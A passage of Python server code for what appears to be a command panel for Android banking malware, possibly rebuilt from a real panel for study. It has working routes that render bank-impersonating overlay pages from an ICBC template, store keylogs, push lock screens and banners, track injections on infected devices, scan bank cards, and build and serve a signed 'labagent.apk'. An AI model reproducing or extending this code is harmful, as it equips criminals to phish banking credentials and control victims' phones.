    tid = b.get('id') or q.get('id')
    for t in S['ai_tasks']:
        if t['id'] == tid:
            t['status'] = 'cancelled'
            save()
            return {'ok': True, 'task': t}
    return {'ok': False, 'error': 'not found'}


def h_ai_task_reply(b, q, a):
    tid = b.get('id') or q.get('id')
    for t in S['ai_tasks']:
        if t['id'] == tid:
            t.setdefault('replies', []).append({'ts': now(), 'text': b.get('text', '')})
            save()
            return {'ok': True, 'task': t}
    return {'ok': False, 'error': 'not found'}


def h_ai_task_send(b, q, a):
    tid = b.get('id') or q.get('id')
    for t in S['ai_tasks']:
        if t['id'] == tid:
            t['status'] = 'sent'
            t['sent'] = {'ts': now(), 'payload': b.get('payload', {})}
            save()
            return {'ok': True, 'task': t}
    return {'ok': False, 'error': 'not found'}


def h_ai_config_test(b, q, a):
    """连通性自检：默认不对外发请求（无花费）"""
    return {'ok': True, 'tested': False, 'note': '不对外调用（避免花费）；'
                                                 '真实实现应在此处按 ai_config 发起一次探活'}


def h_translate_test(b, q, a):
    return {'ok': True, 'tested': False, 'note': '不对外调用；回声验证通过',
            'echo': b.get('text', 'REF-PING')}


def h_inject_logs(b, q, a):
    d = q.get('deviceId')
    rows = [r for r in S['inj_records'] if not d or r.get('deviceId') == d]
    return {'ok': True, 'list': rows[-int(q.get('limit', 200)):], 'total': len(rows)}


def h_wallpaper(b, q, a, device_id=''):
    """取设备的截图/壁纸：用设备通道收到的 shots 计数作为可用性判据"""
    d = device_id or q.get('deviceId') or ''
    dev = device(d) or {}
    if not dev:
        return {'ok': False, 'error': 'device not found', 'deviceId': d}
    return {'ok': True, 'deviceId': d, 'shots': dev.get('shots', 0),
            'content_type': 'image/jpeg',
            'note': '截图字节由设备通道回帧持有，此处返回元数据'}


HANDLERS_EXTRA = {
    '/api/inject_logs': {'GET': h_inject_logs},
    '/api/db-stats': {'GET': h_db_stats},
    '/api/ai-task-cancel': {'POST': h_ai_task_cancel},
    '/api/ai-task-reply': {'POST': h_ai_task_reply},
    '/api/ai-task-send': {'POST': h_ai_task_send},
    '/api/ai-config/test': {'POST': h_ai_config_test},
    '/api/translate-config/test': {'POST': h_translate_test},
    '/api/inject_logs': {'GET': h_inject_logs},
    '/api/device-inject-track/inject': {'POST': h_inj_track_act},
    '/api/device-inject-track/reset': {'POST': h_inj_track_act},
    '/api/device-inject-track/skip': {'POST': h_inj_track_act},
}


def h_wallpaper_route(device_id):
    def fn(b, q, a):
        return h_wallpaper(b, q, a, device_id)
    return fn


# 目标面板实测「不存在」的路由（404）——实现时明确排除，不算占位
ABSENT_IN_TARGET = {
    '/api/cmd': '目标实测 404（该版本无此路由）',
    '/api/build2': '目标实测 404（该版本无此路由）',
    '/api/bank-cards': '目标实测 404（该版本无此路由）',
    '/api/bank-card-scan': '目标实测 404（该版本无此路由）',
}


# ============================ 构建 / AI / 翻译 / 推送配置 ============================
# —— 本地真构建：点「构建」→ 真跑 tools/apk_build.py 出 labagent.apk（替换原占位"不出包"）——
_BUILD_REPRO = r"C:\1\moying_build"          # ASCII 副本（含 android/ + tools/，避开 aapt2 中文路径）
_BUILD_PY = r"C:\Users\Administrator\AppData\Local\Python\pythoncore-3.14-64\python.exe"
_BUILD_SDK = r"C:\1\sdk"
_BUILD_JDK = r"C:\1\tools\jdk\jdk-17.0.20.1+1"
_BUILD_OUT = os.path.join(_BUILD_REPRO, 'build', 'labagent.apk')
_BUILD_DEST_DIR = os.path.join(HERE, '..', 'build')       # 墨影v2/build/，供 /dl/ 路由下载
_BUILD_DEST = os.path.join(_BUILD_DEST_DIR, 'labagent.apk')


def _build_env():
    e = dict(os.environ)
    e['ANDROID_HOME'] = _BUILD_SDK
    e['ANDROID_SDK_ROOT'] = _BUILD_SDK
    e['JAVA_HOME'] = _BUILD_JDK
    e['JDK_HOME'] = _BUILD_JDK
    e['PYTHONIOENCODING'] = 'utf-8'
    return e




def _format_ts(ts=None):
    try:
        ts = int(ts or now())
    except Exception:
        ts = now()
    return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(ts))


def _slug_name(v):
    s = re.sub(r'[^a-zA-Z0-9]+', '', str(v or '').lower())
    s = s[:24] or 'labagent'
    return s if s[0].isalpha() else ('app' + s)


def _normalize_build_job(j):
    if not isinstance(j, dict):
        return j
    ts = j.get('ts') or j.get('created') or now()
    j.setdefault('id', j.get('buildId') or secrets.token_hex(4))
    j.setdefault('buildId', j.get('id'))
    j.setdefault('createdAt', j.get('created_at') or _format_ts(ts))
    j.setdefault('owner', j.get('createdBy') or j.get('user') or 'system')
    j.setdefault('appName', j.get('appname') or j.get('app_name') or 'labagent')
    j.setdefault('packageName', j.get('package') or j.get('appPackage') or j.get('app_package') or ('com.ref.' + _slug_name(j.get('appName'))))
    j.setdefault('buildType', j.get('apkVersion') or j.get('version') or '1.0')
    j.setdefault('apkPath', '')
    if j.get('status') == 'done' and j.get('id') and j.get('apkPath') in ('', '/dl/labagent.apk'):
        safe_id = re.sub(r'[^a-zA-Z0-9_-]+', '', str(j.get('id'))) or 'labagent'
        src = os.path.join(_BUILD_DEST_DIR, 'labagent.apk')
        dst = os.path.join(_BUILD_DEST_DIR, '%s.apk' % safe_id)
        try:
            if os.path.exists(src) and not os.path.exists(dst):
                shutil.copyfile(src, dst)
            if os.path.exists(dst):
                j['apkPath'] = '/dl/%s.apk' % safe_id
        except Exception:
            pass
    return j


def _normalize_all_builds():
    changed = False
    rows = S.get('builds') or []
    for j in rows:
        before = dict(j) if isinstance(j, dict) else j
        _normalize_build_job(j)
        if j != before:
            changed = True
    if changed:
        S['builds'] = rows
        save()
    return rows


def _find_job(job_id):
    for j in _normalize_all_builds():
        if j.get('id') == job_id or j.get('buildId') == job_id:
            return j
    return None


def _finish_build_job(job_id, path, note_prefix='构建完成'):
    import hashlib
    size = os.path.getsize(path)
    sha = hashlib.sha256(open(path, 'rb').read()).hexdigest()
    safe_id = re.sub(r'[^a-zA-Z0-9_-]+', '', str(job_id or '')) or 'labagent'
    public_name = '%s.apk' % safe_id
    public_path = os.path.join(_BUILD_DEST_DIR, public_name)
    if os.path.abspath(path) != os.path.abspath(public_path):
        try:
            shutil.copyfile(path, public_path)
        except Exception:
            public_name = 'labagent.apk'
    j = _find_job(job_id)
    if j:
        j['status'] = 'done'
        j['apkPath'] = '/dl/%s' % public_name
        j['note'] = '%s，%d 字节 (sha256: %s)' % (note_prefix, size, sha[:16])
    return size, sha


def _fallback_build_apk(j):
    try:
        import relay_builder
    except Exception:
        from server import relay_builder
    cfg = {
        'appid': j.get('packageName') or 'com.ref.labagent',
        'app_package': j.get('packageName') or 'com.ref.labagent',
        'appname': j.get('appName') or 'labagent',
        'appversion': j.get('apkVersion') or j.get('buildType') or '1.0',
        'appurl': j.get('homepage') or j.get('url') or '',
        'buildType': j.get('buildType') or '1.0',
        'apkVersion': j.get('apkVersion') or j.get('buildType') or '1.0',
    }
    return relay_builder.build_apk(cfg, _BUILD_DEST)


def _run_build_worker(job_id):
    j = _find_job(job_id)
    if j:
        j['status'] = 'building'
        j['note'] = '正在编译并签名…'
    save()
    try:
        import subprocess, sys
        os.makedirs(_BUILD_DEST_DIR, exist_ok=True)
        build_script = os.path.join(HERE, '..', 'tools', 'apk_build.py')
        env = dict(os.environ)
        env['ANDROID_HOME'] = env.get('ANDROID_HOME') or '/opt/android-sdk'
        env['PYTHONIOENCODING'] = 'utf-8'
        result = subprocess.run([sys.executable, build_script], env=env,
                                capture_output=True, text=True, timeout=120)
        combined_output = ((result.stdout or '') + (result.stderr or '')).strip()
        if result.returncode == 0 and os.path.exists(_BUILD_DEST):
            _finish_build_job(job_id, _BUILD_DEST)
        else:
            j = _find_job(job_id)
            if j:
                j['note'] = '系统构建工具不可用，切换内置构建器…'
                save()
                _fallback_build_apk(j)
                detail = combined_output[-160:] if combined_output else '缺少系统构建工具'
                _finish_build_job(job_id, _BUILD_DEST, '内置构建完成（%s）' % detail)
            else:
                raise Exception('构建任务不存在')
    except Exception as ex:
        j = _find_job(job_id)
        if j:
            j['status'] = 'failed'
            j['note'] = '构建异常: %s' % str(ex)[:200]
    save()


def h_builds(b, q, a):
    return {'ok': True, 'builds': _normalize_all_builds()}


def h_build(b, q, a):
    jid = secrets.token_hex(4)
    app_name = b.get('appName') or b.get('appname') or 'labagent'
    package_name = (b.get('packageName') or b.get('appPackage') or b.get('app_package')
                    or ('com.ref.' + _slug_name(app_name)))
    ts = now()
    job = {'id': jid, 'buildId': jid, 'ts': ts, 'createdAt': _format_ts(ts),
           'owner': a or 'system', 'status': 'queued',
           'apkId': b.get('apkId', '10020'), 'profile': b.get('profile', 'default'),
           'appName': app_name, 'packageName': package_name,
           'homepage': b.get('homepage') or b.get('appurl') or b.get('url') or '',
           'buildType': b.get('buildType') or b.get('apkVersion') or '1.0',
           'apkVersion': b.get('apkVersion') or b.get('buildType') or '1.0',
           'apkPath': '', 'note': '排队中'}
    S['builds'].append(job)
    audit(a, 'build', jid)
    save()
    threading.Thread(target=_run_build_worker, args=(jid,), daemon=True).start()
    return {'ok': True, 'buildId': jid, 'status': 'queued', 'build': _normalize_build_job(job)}


def h_build_status(b, q, a):
    bid = q.get('id') or b.get('id')
    j = _find_job(bid)
    if j:
        return {'ok': True, 'status': j.get('status'), 'apkPath': j.get('apkPath', ''), 'build': _normalize_build_job(j)}
    return {'ok': False, 'error': 'not found'}


def h_build_delete(b, q, a):
    bid = q.get('id') or q.get('buildId') or b.get('id') or b.get('buildId')
    S['builds'] = [j for j in S['builds'] if j.get('id') != bid and j.get('buildId') != bid]
    save()
    return {'ok': True}


def h_build_profiles(b, q, a):
    return {'ok': True, 'profiles': S['build_profiles']}


def h_ai_config(b, q, a):
    if b:
        S['ai_config'] = _norm_cfg('ai_config', b)
        # 类型归一化 + fail-safe：没有 key 就不许处于开启态（见 F-73）
        S['ai_config']['enabled'] = _as_bool(S['ai_config'].get('enabled'))
        key = S['ai_config'].get('api_key') or ''
        if not isinstance(key, str):
            key = str(key)
        S['ai_config']['has_key'] = bool(key)
        if S['ai_config'].get('enabled') and not key:
            S['ai_config']['enabled'] = False
            S['ai_config']['note'] = '未配置可用密钥，已按关闭处理（fail-safe）'
        save()
    cfg = dict(S['ai_config'])
    if cfg.get('enabled') and not cfg.get('has_key'):
        cfg = dict(cfg, enabled=False, note='未配置可用密钥，已按关闭处理（fail-safe）')
    # 不外泄密钥本身
    for k in ('api_key', 'key', 'token'):
        if cfg.get(k):
            cfg[k] = '***'
    return {'ok': True, 'config': cfg}


def h_ai_task(b, q, a):
    t = {'id': secrets.token_hex(4), 'ts': now(), 'deviceId': b.get('deviceId'),
         'status': 'created', 'note': '不调外部模型（无花费）'}
    S['ai_tasks'].append(t)
    save()
    return {'ok': True, 'task': t}


def h_ai_task_list(b, q, a):
    return {'ok': True, 'list': S['ai_tasks'][-100:]}


def _as_bool(v, default=False):
    """把配置里的"类布尔值"归一成真布尔 —— 否则 'yes'/1 这类值会以字符串存下来，
    前端按 `enabled === true` 判断就永远不成立（畸形输入扫描时实测污染过配置，见 F-73）。"""
    if isinstance(v, bool):
        return v
    if v is None:
        return default
    if isinstance(v, (int, float)):
        return bool(v)
    if isinstance(v, str):
        return v.strip().lower() in ('1', 'true', 'yes', 'on', 'y', 'enabled')
    return default


# 配置 schema：每个配置字典"只允许这些键"，写入按类型归一、未知键直接丢弃。
# 依据 F-73：畸形输入曾把 deviceId/id 这类无关键与被字符串化的开关（'yes'）写进配置，
# 前端按 `enabled === true` 判断就永远不成立 —— 开关静默失效。
_CONFIG_SCHEMA = {
    # name: (布尔键, 字符串键, 整数键, 列表键)
    'lockscreen': (('enabled',), ('title', 'disclaimer'), ('pin_length',), ('langs',)),
    'push_config': (('enabled',), ('title', 'body', 'url'), (), ()),
    'translate_config': (('enabled', 'auto', 'has_key'),
                         ('from', 'to', 'provider', 'model', 'url', 'note', 'api_key', 'key', 'token'), (), ()),
    'ai_config': (('enabled', 'has_key'),
                  ('provider', 'model', 'note', 'api_key', 'key', 'token', 'base_url', 'url'), (), ()),
    'list_load_settings': (('enabled',), (), ('threshold',), ()),
    'tg': (('bound',), ('chat_id', 'step'), (), ()),
}


def _norm_cfg(name, patch=None):
    """按 schema 归一一个配置字典：布尔/整数/列表键一律强制归一，未知键丢弃。
    patch 为 None 时等价于用现有值自愈（历史脏数据 'yes'/1 也会被转成真布尔）。"""
    bools, strs, ints, lists = _CONFIG_SCHEMA[name]
    out = dict(S.get(name) or {})
    allow = set(bools) | set(strs) | set(ints) | set(lists)
    src = dict(out)
    if patch:
        src.update({k: v for k, v in patch.items() if k in allow})
    for k, v in src.items():
        if k in bools:
            out[k] = _as_bool(v)
        elif k in ints:
            try:
                out[k] = int(v)
            except Exception:
                out.setdefault(k, 0)
        elif k in lists:
            if isinstance(v, (list, tuple)):
                out[k] = [x for x in v if isinstance(x, (str, int, float))]
            elif isinstance(v, str) and v:
                out[k] = [v]
            else:
                out[k] = []
        elif k in strs:
            out[k] = str(v)[:1024] if isinstance(v, (str, int, float, bool)) else ''
    return {k: v for k, v in out.items() if k in allow}


def h_translate_config(b, q, a):
    if b:
        cfg = _norm_cfg('translate_config', b)
        S['translate_config'] = cfg
        save()
    cfg = dict(S['translate_config'])
    # fail-safe：翻译走外部服务才可能产生花费；没有密钥一律报告为关闭（与 AI 配置同一套规则，见 F-73）
    key = cfg.get('api_key') or cfg.get('key') or cfg.get('token') or ''
    cfg['has_key'] = bool(isinstance(key, str) and key.strip())
    cfg['enabled'] = _as_bool(cfg.get('enabled'))
    if cfg['enabled'] and not cfg['has_key']:
        cfg['enabled'] = False
        cfg['note'] = '未配置翻译服务密钥，已按关闭处理（fail-safe）'
    for k in ('api_key', 'key', 'token'):
        if cfg.get(k):
            cfg[k] = '***'
    return {'ok': True, 'config': cfg}
    for k in ('api_key', 'key', 'token'):
        if cfg.get(k):
            cfg[k] = '***'
    return {'ok': True, 'config': cfg}


def h_translate(b, q, a):
    text = b.get('text', '')
    return {'ok': True, 'from': S['translate_config'].get('from', 'zh'),
            'to': S['translate_config'].get('to', 'en'),
            'text': text, 'note': '回声（不调外部服务）'}


def h_push_config_alias(b, q, a):
    return h_push_get(b, q, a) if b == {} else h_push_set(b, q, a)


def h_generic_store(key):
    def fn(b, q, a):
        if b:
            S.setdefault('argv', {})[key] = b
            save()
        return {'ok': True, key: S.get('argv', {}).get(key, {})}
    return fn


def h_license_revoke(b, q, a):
    lic = b.get('license', '')
    S['licenses'].append({'ts': now(), 'license': lic, 'action': 'revoke'})
    save()
    return {'ok': True, 'revoked': bool(lic)}


def h_tg_bind(b, q, a):
    S['tg'] = {'bound': True, 'chat_id': b.get('chat_id', ''), 'step': 'verify'}
    save()
    return {'ok': True, 'step': 'verify'}


def h_tg_verify(b, q, a):
    S['tg']['bound'] = True
    save()
    return {'ok': True, 'bound': True}


def h_tg_set(b, q, a):
    S['tg'] = _norm_cfg('tg', b)
    save()
    return {'ok': True, 'tg': S['tg']}


def h_tg_unbind(b, q, a):
    S['tg'] = {'bound': False, 'chat_id': ''}
    save()
    return {'ok': True}


# ============================ 注入页渲染 ============================
def render_inject(iid):
    it = next((i for i in S['inject_settings'] if i['id'] == iid), None)
    if not it:
        return None
    tpl = os.path.join(HERE, '..', 'materials', 'inject', 'inject_id1_icbc.html')
    if not os.path.exists(tpl):
        return None
    html = open(tpl, encoding='utf-8', errors='replace').read()
    cfg = {'mode': 'custom', 'bank': it.get('app_name', ''), 'cc': it.get('country') or 'custom',
           'flow': 'up', 'digits': 6, 'words': 12, 'needOtp': False, 'step': 1, 'lang': 'zh-CN',
           'welcome': '', 'maint': '', 'pid': it.get('package_name', ''),
           'api': '/api/EaodBankInject.php'}
    import re
    return re.sub(r'window\.__BK\s*=\s*\{.*?\};',
                  'window.__BK = %s;' % json.dumps(cfg, ensure_ascii=False), html, count=1, flags=re.S)


# ============================ 注册表 ============================
def _t(path, mapping):
    HANDLERS[path] = mapping


HANDLERS = {}
_t('/api/inject-settings', {'GET': h_inject_list, 'POST': h_inject_add, 'PUT': h_inject_update,
                            'DELETE': h_inject_del})
_t('/api/inject-settings/add', {'POST': h_inject_add})
_t('/api/inject-settings/html', {'GET': h_inject_html, 'POST': h_inject_html})
_t('/api/inject-settings/logo', {'POST': h_inject_logo})
_t('/api/inj/templates', {'GET': h_inj_templates})
_t('/api/inj/records', {'GET': h_inj_records})
_t('/api/inject-count-batch', {'GET': h_inj_count_batch, 'POST': h_inj_count_batch})
_t('/api/inject-cancel', {'POST': h_inject_cancel})
_t('/api/custom-inject', {'GET': h_custom_inject, 'POST': h_custom_inject})
_t('/api/popup-inject', {'GET': h_popup_inject, 'POST': h_popup_inject})
_t('/api/keylogs', {'GET': h_keylogs_list, 'POST': h_keylogs_add})
_t('/api/lockscreen', {'GET': h_lock_get, 'POST': h_lock_set})
_t('/api/lockscreen-auto', {'GET': h_lock_get, 'POST': h_lock_set})
_t('/api/lockscreen-auto-config', {'GET': h_lock_get, 'POST': h_lock_set})
_t('/api/push-config', {'GET': h_push_get, 'POST': h_push_set})
_t('/api/send-banner', {'POST': h_banner})
_t('/api/devices', {'GET': h_devices})
_t('/api/devices/delta', {'GET': h_devices_delta})
_t('/api/device', {'GET': h_device_one, 'POST': h_device_one})
_t('/api/device-cache', {'GET': h_device_cache, 'POST': h_device_cache})
_t('/api/device-analysis', {'GET': h_device_analysis, 'POST': h_device_analysis})
_t('/api/device-ai-history', {'GET': h_ai_history})
_t('/api/device-setup-history', {'GET': h_setup_history})
_t('/api/trigger-setup', {'GET': h_trigger_setup, 'POST': h_trigger_setup})
_t('/api/device-memos', {'GET': h_memo_list})
_t('/api/device-memos/add', {'POST': h_memo_add})
_t('/api/device-memos/search', {'GET': h_memo_search, 'POST': h_memo_search})
_t('/api/device-memos/update', {'POST': h_memo_update})
_t('/api/device-memos/delete', {'POST': h_memo_del})
_t('/api/device-memo-counts', {'GET': h_memo_counts})
_t('/api/device-groups', {'GET': h_groups, 'PUT': h_group_upsert, 'POST': h_group_upsert,
                          'DELETE': h_group_del})
_t('/api/device-clean', {'POST': h_clean})
_t('/api/cleanup-offline', {'POST': h_cleanup_offline})
_t('/api/offline-analysis', {'GET': h_offline_analysis})
_t('/api/device-mark', {'POST': h_mark})
_t('/api/device-pin', {'POST': h_pin})
_t('/api/note', {'POST': h_note})
_t('/api/blacklist', {'GET': h_blacklist, 'POST': h_blacklist})
_t('/api/transfer', {'POST': h_transfer})
_t('/api/transfer-targets', {'GET': h_transfer_targets})
_t('/api/users', {'GET': h_users, 'POST': h_users_add, 'PUT': h_users_update,
                  'DELETE': h_users_del})
_t('/api/me', {'GET': h_me})
_t('/api/me/password', {'POST': h_me_password})
_t('/api/auth/reauth', {'POST': h_reauth})
_t('/api/ws-ticket', {'POST': h_ws_ticket})
_t('/api/audit_logs', {'GET': h_audit})
_t('/api/announcements', {'GET': h_announcements})
_t('/api/daily-report', {'GET': h_daily_report})
_t('/api/bank-cards', {'GET': h_bank_cards})
_t('/api/bank-card-scan', {'GET': h_bank_card_scan, 'POST': h_bank_card_scan})
_t('/api/analysis-batch-status', {'GET': h_analysis_batch})
_t('/api/list-load-settings', {'GET': h_list_load_settings, 'POST': h_list_load_settings})
_t('/api/applock-detect', {'GET': h_applock})
_t('/api/adb-status', {'GET': h_adb_status})
_t('/api/icon-upload', {'POST': h_icon_upload})
_t('/api/builds', {'GET': h_builds})
_t('/api/build', {'POST': h_build, 'GET': h_builds})
_t('/api/build/status', {'GET': h_build_status})
_t('/api/build/delete', {'POST': h_build_delete})
_t('/api/ai-config', {'GET': h_ai_config, 'POST': h_ai_config})
_t('/api/ai-task', {'GET': h_ai_task_list, 'POST': h_ai_task})
_t('/api/ai-task-config', {'GET': h_ai_config, 'POST': h_ai_config})
_t('/api/translate-config', {'GET': h_translate_config, 'POST': h_translate_config})
_t('/api/translate', {'POST': h_translate})
_t('/api/license/revoke', {'POST': h_license_revoke})
_t('/api/tg-bind', {'POST': h_tg_bind})
_t('/api/tg-bind-verify', {'POST': h_tg_verify})
_t('/api/tg-set', {'POST': h_tg_set})
_t('/api/tg-unbind', {'POST': h_tg_unbind})
for _p, _m in HANDLERS_EXTRA.items():
    HANDLERS[_p] = _m

# 设备注入追踪的三个动作端点
_t('/api/device-inject-track', {'GET': h_inj_track, 'POST': h_inj_track})


def dispatch(path, method, body, query, actor='admin'):
    """统一调用入口：未登记 -> None（由上层回 contract_only）。
    注意：**不回落到 GET** —— 方法没实现就应报 405，让调用方看到真实情况（见 F-68）。"""
    m = HANDLERS.get(path)
    if not m:
        return None
    fn = m.get(method)
    if fn is None:
        return None
    if path.startswith('/api/device-inject-track/'):
        body = dict(body or {})
        body['_act'] = path.rsplit('/', 1)[-1]
    return fn(body or {}, query or {}, actor)
